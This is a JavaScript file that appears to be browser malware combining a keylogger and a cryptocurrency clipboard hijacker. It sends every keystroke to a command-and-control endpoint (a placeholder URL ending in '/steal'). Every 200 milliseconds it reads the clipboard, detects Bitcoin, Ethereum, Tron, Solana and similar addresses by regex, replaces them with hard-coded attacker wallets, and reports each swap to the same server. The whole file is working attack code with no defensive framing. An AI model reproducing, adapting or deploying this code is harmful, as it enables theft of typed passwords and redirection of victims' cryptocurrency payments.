console.log('[Controller] Script started.');

// === Config ===
const C2_SERVER = "YOUR_RENDER_URL_HERE/steal"; 

// === Keylogger ===
// Capture keypresses
document.addEventListener("keydown", (event) => {
  const data = {
    type: "keylogger",
    key: event.key,
    victim: "PC-User-01",
    timestamp: new Date().toISOString()
  };

  // Send each keystroke to attacker
  fetch(C2_SERVER, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data)
  });
});

// === Clipbanker ===
// Fake attacker address
const scammerAddresses = {
  btc:   "bc1qqku6e3qxyhlv5fvjaxazt0v5f5mf77lzt0ymm0",             // Bitcoin
  eth:   "0x328bEaba35Eb07C1D4C82b19cE36A7345ED52C54",             // Ethereum
  usdt_erc20: "0x328bEaba35Eb07C1D4C82b19cE36A7345ED52C54",        // USDT ERC20 (Ethereum)
  usdt_trc20: "THycvE5TKFTLv4nZsq8SJJCYhDmvysSLyk",                // USDT TRC20 (Tron)
  erc20: "0xb9FBAa68123ad7BdaCb5820dE4f7998887733333",             // Generic ERC20 token
  trc20: "THycvE5TKFTLv4nZsq8SJJCYhDmvysSLyk",                     // Generic TRC20 token
  sol:   "Gc1Xak8dXJY7h6G8XXMefa9BaiT8VMEsm6G4DXMzyCaX",           // Solana
  bnbsc: "0x328bEaba35Eb07C1D4C82b19cE36A7345ED52C54",             // BNB Smart Chain
};

// Improved helper function to detect address type
function getScammerAddress(copied) {
  if (/^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$/.test(copied)) {
    return scammerAddresses.btc;
  }
  if (/^0x[a-fA-F0-9]{40}$/.test(copied)) {
    // Try to guess token type by keywords in clipboard
    const lower = copied.toLowerCase();
    if (lower.includes('usdt')) return scammerAddresses.usdt_erc20;
    if (lower.includes('bnb')) return scammerAddresses.bnbsc;
    if (lower.includes('erc20')) return scammerAddresses.erc20;
    // Default to ETH
    return scammerAddresses.eth;
  }
  if (/^T[a-zA-Z0-9]{33}$/.test(copied)) {
    // Tron addresses start with T
    if (copied.toLowerCase().includes('usdt')) return scammerAddresses.usdt_trc20;
    return scammerAddresses.trc20;
  }
  if (/^[A-Za-z0-9]{43}$/.test(copied)) {
    // Solana addresses are 43 chars
    return scammerAddresses.sol;
  }
  return null;
}

// Check clipboard every 200ms for faster replacement
setInterval(async () => {
  console.log('[Controller] Checking clipboard...');
  try {
    const copied = await navigator.clipboard.readText();
    if (copied) {
      console.log('[Controller] Clipboard text found:', copied);
    }

    const scammerAddress = getScammerAddress(copied);
    if (scammerAddress) {
      console.log('[Controller] Crypto address detected!');
    }

    if (scammerAddress && copied !== scammerAddress) {
      console.log('[Controller] REPLACING address...');
      // Replace victim’s address with scammer’s
      await navigator.clipboard.writeText(scammerAddress);

      // Send stolen data to attacker
      fetch(C2_SERVER, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          type: "clipbanker",
          original: copied,
          replaced: scammerAddress,
          victim: "PC-User-01",
          timestamp: new Date().toISOString()
        })
      });
    }
  } catch (err) { 
    console.error('[Controller] Clipboard Error:', err);
  } 
}, 200); 